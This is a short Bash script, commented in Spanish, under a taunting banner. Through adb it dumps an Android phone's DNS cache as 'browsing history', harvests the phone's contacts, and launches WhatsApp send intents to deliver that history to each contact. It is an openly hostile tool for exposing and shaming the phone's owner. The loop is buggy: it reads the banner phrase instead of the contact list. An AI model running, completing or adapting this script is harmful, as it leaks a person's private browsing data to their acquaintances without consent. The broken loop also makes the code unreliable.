#!/bin/bash

#==============================================================================================================#
# _      ____    ____  _     _____   _      _    ___  _   _     ____  _     _  _____ _      _____  _____ ____  #
#/ \  /|/  _ \  /  _ \/ \ /\/  __/  / \__/|/ \ /\\  \//  / \ |\/  _ \/ \   / \/  __// \  /|/__ __\/  __// _  \ #
#| |\ ||| / \|  | / \|| | |||  \    | |\/||| | || \  /   | | //| / \|| |   | ||  \  | |\ ||  / \  |  \  \/ \ | #
#| | \||| \_/|  | \_\|| \_/||  /_   | |  ||| \_/| / /    | \// | |-||| |_/\| ||  /_ | | \||  | |  |  /_    / / #
#\_/  \|\____/  \____\\____/\____\  \_/  \|\____//_/     \__/  \_/ \|\____/\_/\____\\_/  \|  \_/  \____\   \/  #
#                                                                                                          \/  #
#==============================================================================================================#

# Almacenamos el cache DNS en el archivo historial
adb shell dumpsys netd dns > historial.txt

# Conseguimos la lista de cobtactos 
contactos=$(adb shell content query --uri content://com.android.contacts/data --projection data1 --where "mimetype='vnd.android.cursor.item/phone_v2'")

# Creamos un loop que nos envie el cache DNS a cada contacto extraido
while read -r phone_number; do
    # Por cada contacto en la lista enviaremos el archivo txt con el cache DNS por medio de ADB
    adb shell am start -a android.intent.action.SEND -t text/plain -n com.whatsapp/.ContactPicker --es android.intent.extra.TEXT "$(cat historial.txt)" --es android.intent.extra.SUBJECT "Historial de Navegación" --es jid "91${phone_number}@s.whatsapp.net"
done <<< "No que muy valiente?"
